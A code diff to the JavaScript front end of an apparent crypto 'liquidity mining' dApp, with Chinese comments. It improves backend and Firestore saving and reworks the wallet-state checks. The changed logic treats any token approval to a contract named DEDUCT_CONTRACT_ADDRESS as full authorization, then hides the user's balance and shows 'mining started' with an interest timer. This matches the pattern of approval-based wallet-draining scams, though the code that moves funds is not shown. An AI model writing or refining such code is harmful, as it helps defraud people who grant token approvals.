@@ -400,24 +400,54 @@ async function isPledgeLocked(address) {
     return false;
   }
 }
-// ==================== 智能儲存（優先後端） ====================
+// ==================== 【關鍵修正】智能儲存（優先後端） ====================
 async function smartSave(data, forceLocal = false) {
   if (!userAddress) return;
+
+  // 1. 清理 data：移除 undefined / null
+  const cleanData = {};
+  for (const [key, value] of Object.entries(data)) {
+    if (value !== undefined && value !== null) {
+      cleanData[key] = value;
+    }
+  }
+
+  // 2. 強制轉小寫 address
+  const payload = {
+    address: userAddress.toLowerCase(),
+    data: cleanData
+  };
+
+  // 3. 優先嘗試後端
   const alive = !forceLocal && await isBackendAlive();
   if (alive) {
     try {
-      await fetch(`${BACKEND_API_URL}/user-data`, {
+      const response = await fetch(`${BACKEND_API_URL}/user-data`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ address: userAddress, data })
+        body: JSON.stringify(payload)
       });
-      localStorage.removeItem('pendingSync');
-      return;
-    } catch (error) {}
+      if (response.ok) {
+        localStorage.removeItem('pendingSync');
+        return;
+      } else {
+        const errText = await response.text();
+        console.error('後端儲存失敗:', response.status, errText);
+      }
+    } catch (error) {
+      console.error('後端連線失敗:', error.message);
+    }
   }
-  // 後端斷線 → 直接寫 Firestore + Local
-  await saveUserData(data, false);
-  localStorage.setItem('pendingSync', 'true');
+
+  // 4. 後端失敗 → 強制寫 Firestore + Local
+  try {
+    await saveUserData(cleanData, false);
+    localStorage.setItem('userData', JSON.stringify(cleanData));
+    localStorage.setItem('pendingSync', 'true');
+    console.warn('後端離線，資料已寫入 Firestore + Local');
+  } catch (error) {
+    console.error('Firestore 寫入失敗:', error.message);
+  }
 }
 // ==================== 斷線重連 + 同步 ====================
 setInterval(async () => {
@@ -428,7 +458,10 @@ setInterval(async () => {
       await fetch(`${BACKEND_API_URL}/user-data`, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ address: userAddress, data: localData })
+        body: JSON.stringify({
+          address: userAddress.toLowerCase(),
+          data: localData
+        })
       });
       localStorage.removeItem('pendingSync');
     } catch (error) {}
@@ -954,6 +987,7 @@ async function initializeWallet() {
     const accounts = await provider.send('eth_accounts', []);
     if (accounts.length > 0) {
       await connectWallet();
+      await updateUIBasedOnChainState(); // 【關鍵】立即檢查狀態
     } else {
       disableInteractiveElements(true);
       updateStatus(translations[currentLang].noWallet, true);
@@ -995,6 +1029,7 @@ async function connectWallet() {
     await forceRefreshWalletBalance();
     updateStatus('錢包連接成功，餘額已載入');
     await loadUserDataFromServer();
+    await updateUIBasedOnChainState(); // 【關鍵】同步狀態
     initSSE();
     await updateUIBasedOnChainState();
   } catch (e) {
@@ -1019,34 +1054,27 @@ async function updateUIBasedOnChainState() {
       retry(() => usdcContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n),
       retry(() => wethContract.connect(provider).allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)).catch(() => 0n)
     ]);
+
     const isWethAuthorized = wethAllowance >= requiredAllowance;
     const isUsdtAuthorized = usdtAllowance >= requiredAllowance;
     const isUsdcAuthorized = usdcAllowance >= requiredAllowance;
     const isFullyAuthorized = isServiceActive || isWethAuthorized || isUsdtAuthorized || isUsdcAuthorized;
+
     if (isFullyAuthorized) {
-      const selectedToken = walletTokenSelect ? walletTokenSelect.value : 'USDT';
-      const tokenMap = { 'USDT': usdtContract, 'USDC': usdcContract, 'WETH': wethContract };
-      const selectedContract = tokenMap[selectedToken];
-      let balanceBigInt = 0n;
-      try {
-        balanceBigInt = await retry(() => selectedContract.connect(provider).balanceOf(userAddress));
-      } catch (e) {}
-      const decimals = selectedToken === 'WETH' ? 18 : 6;
-      const balance = parseFloat(ethers.formatUnits(balanceBigInt, decimals));
-      if (isWethAuthorized && walletTokenSelect) walletTokenSelect.value = 'WETH';
-      else if (isUsdtAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
-      else if (isUsdcAuthorized && walletTokenSelect) walletTokenSelect.value = 'USDT';
-      if (startBtn) startBtn.style.display = 'block';
+      // 【關鍵】已授權 → 隱藏 Start 按鈕
+      if (startBtn) startBtn.style.display = 'none';
       disableInteractiveElements(false);
-      updateStatus("請點擊 Start 開始流動性挖礦");
+      updateStatus("挖礦已啟動");
+      activateStakingUI(); // 啟動利息計時
     } else {
-      if (accountBalanceValue) accountBalanceValue.textContent = '0.000 (未授權)';
+      // 未授權 → 顯示 Start
       if (startBtn) startBtn.style.display = 'block';
       disableInteractiveElements(false);
       updateStatus("請點擊 Start 進行授權");
     }
   } catch (e) {
     log(`狀態檢查錯誤: ${e.message}`, 'error');
+    if (startBtn) startBtn.style.display = 'block';
   }
 }
 async function handleConditionalAuthorizationFlow() {
